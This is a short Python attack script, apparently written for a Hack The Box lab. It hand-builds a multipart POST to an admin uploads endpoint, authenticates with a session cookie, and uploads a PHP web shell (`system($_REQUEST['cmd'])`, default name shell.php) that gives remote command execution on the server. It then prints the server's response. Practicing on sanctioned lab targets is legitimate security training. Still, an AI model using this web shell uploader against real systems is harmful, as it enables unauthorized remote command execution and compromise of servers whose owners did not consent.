#!/usr/bin/env python3
"""Multipart file upload to the authorized HTB target's admin uploads endpoint."""
import socket
import sys
import os

HOST = os.environ["HTB_TARGET"]
PORT = 80
PATH = "/cdn-cgi/login/admin.php?content=uploads&action=upload"
COOKIE = os.environ["HTB_COOKIE"]

filename = sys.argv[1] if len(sys.argv) > 1 else "shell.php"
brand = sys.argv[2] if len(sys.argv) > 2 else "brand"

# webshell payload: simple command executor
payload = b"<?php echo '<pre>'; system($_REQUEST['cmd']); echo '</pre>'; ?>"

boundary = "----WebKitFormBoundaryHTBxYz123"
parts = []
parts.append(f'--{boundary}\r\nContent-Disposition: form-data; name="name"\r\n\r\n{brand}\r\n')
parts.append(
    f'--{boundary}\r\nContent-Disposition: form-data; name="fileToUpload"; '
    f'filename="{filename}"\r\nContent-Type: application/x-php\r\n\r\n'
)
body = parts[0].encode() + parts[1].encode() + payload + f"\r\n--{boundary}--\r\n".encode()

req = (
    f"POST {PATH} HTTP/1.1\r\n"
    f"Host: {HOST}\r\n"
    "User-Agent: Mozilla/5.0\r\n"
    f"Cookie: {COOKIE}\r\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
    f"Content-Length: {len(body)}\r\n"
    "Connection: close\r\n\r\n"
).encode() + body

s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(20)
s.sendall(req)
resp = b""
while True:
    b = s.recv(8192)
    if not b:
        break
    resp += b
s.close()
head, _, rbody = resp.partition(b"\r\n\r\n")
print(head.decode(errors="replace"))
print("--- BODY tail ---")
print(rbody.decode(errors="replace")[-800:])
